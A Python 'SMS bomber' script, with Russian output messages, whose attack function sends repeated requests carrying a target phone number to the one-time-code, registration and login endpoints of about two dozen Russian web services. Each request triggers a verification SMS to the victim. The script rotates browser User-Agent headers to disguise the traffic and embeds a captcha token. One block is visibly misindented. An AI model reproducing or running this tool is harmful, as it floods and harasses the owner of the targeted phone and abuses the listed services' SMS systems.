import random
import requests
import datetime

# colours
green = '\033[92m'
cyan = '\033[95m'
bold = '\033[1m'
underline = '\033[4m'
end = '\033[0m'
red = '\033[91m'

# headers for optimizing sms sent
heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
        'Accept': '*/*'
    },
    {
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
        'Accept': '*/*'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
        'Accept': '*/*'
    },
    {
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
        'Accept': '*/*'
    },
]


def check(sent, sms):
    if sent == sms:
        quit()


def time(sent):
    a = datetime.datetime.now()
    time = (str(a.hour) + ':' + str(a.minute) + ':' + str(a.second))
    msg1 = f"{green}{bold}{str(sent)}{end} отправлено!"
    msg2 = f"{green}{bold}{str(time)}{end}"
    if int(sent) < 10:
        print(f"{msg1}         {msg2}")
    elif int(sent) < 100:
        print(f"{msg1}        {msg2}")
    elif int(sent) < 1000:
        print(f"{msg1}       {msg2}")
    elif int(sent) < 10000:
        print(f"{msg1}      {msg2}")
    else:
        print(f"{msg1}     {msg2}")


def attack(number, sms):
    number_7 = str(7) + number
    number_plus7 = str(+7) + number
    number_8 = str(8) + number
    sent = 0
    print("-" * 33)
    print(f"|  {green}{bold}  Количество   {end} | {green}{bold}     Время     {end} |")
    print("-" * 33)
    HEADERS = random.choice(heads)
    while sent <= sms:
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7},
                          headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.get(f'https://sso.cloud.qlean.ru/http/users/requestotp?phone=7{number}&clientId=undefined&sessionId=4384', headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": number_plus7, "api": 2, "email": "email", "x-email": "x-email"},
                          headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
           requests.post('https://www.citilink.ru/registration/confirm/phone/+' + number_7 + '/', headers=HEADERS)
           sent += 1
           time(sent)
           check(sent, sms)
        except:
            pass

        try:

            requests.post('https://app.karusel.ru/api/v2/token/', data={"phone": number_7, "recaptcha_token": "03AGdBq26m52Y0gwZWbUDAwFyR-9vk9SgabmDgp1HfH70FkOLwWqy8brPAWuzva-O1mdn51qtLcqN1PcXI04iFkVc3fnxO8VSYOXSJIvavPb5-HBIHrRGo-Ze7OJxwznBc7I0WYK5ySgwdKTacDt33dvfqWUmmVZpITR6pg_tB-4-DeOOFw9FoR4ssl8u9NQH8HYkGlXnP2xnD7UuueVU0LycEelVWp-Y32i5fZHY-SRo6EVUVol0pTHtn5mD91SFtq-lQZmBU0-WZZ9S3b6VUOtBPm2n4wcVQ69ilHaMm4YLsi-5zK3nkxXMxkNQvtFNMkGIH1368qXui7Z0TiP5NCiqttrpZVTYxKlqw6ls0S45qN4sfhsp5b-FlRvquBpmsH4o6SWm77C6XaHfdigcz90lphxU22I6RzzAPu-iZv5cxUis98zVj5vrLNnj89Su1j_zRY242QO-9faHvGiZJUQBVsOvYiDQlMw"}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', json={"phone": number_plus7}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + number_7}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": number_7}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': number_7, "locale": 'en', 'countryCode': 'ru', 'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.get(f'https://findclone.ru/register?phone=+{number_7}', headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('https://moscow.rutaxi.ru/ajax_auth.html?qip=36653739902704254&lang=ru&source=0', data={"l": number, "p":"", "rem": "0", "c": "3"}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('http://taxiseven.ru/auth/register', data={"phone": number_plus7}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', data={"st.r.phone": number_plus7}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post(f'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code?msisdn={number_7}', headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('https://trulolo.com/register', data={"fname": "Алексей", "sname": "Иванов", "day": "5", "month": "1", "year": "1996", "gender": "1", "country": "3159", "region": "4312", "city": "4400", "phone": number, "rools": "1", "enter": "Продолжить"}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('http://shuri-muri.com/registration/', data={"fname": "Алексей", "sname": "Иванов", "day": "5", "month": "1", "year": "1996", "gender": "1", "country": "3159", "region": "4312", "city": "4400", "phone": number_7, "rools": "1"}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('https://almaz.comfortkino.ru/local/php_interface/api/v1/user/login/', data={"phone": number_7}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": number_7}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": number_plus7}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass
        
        try:
            requests.post('https://api.like-video.com/likee-activity-flow-micro/commonApi/sendDownloadSms', json={"telephone": number_7, "lang": "ru"}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass
        
         try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": number_plus7, "login": "ivan@gmail.com", "password": "Qwasz123", "agreement": "true", "oferta": "true", "oferta": "true"}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('https://www.etm.ru/cat/runprog.html', data={"mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes", "m_phone": number, "param": ""}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

        try:
            requests.post('https://mousam.ru/newapi/checkphone.json', data={"phone": number_7}, headers=HEADERS)
            sent += 1
            time(sent)
            check(sent, sms)
        except:
            pass

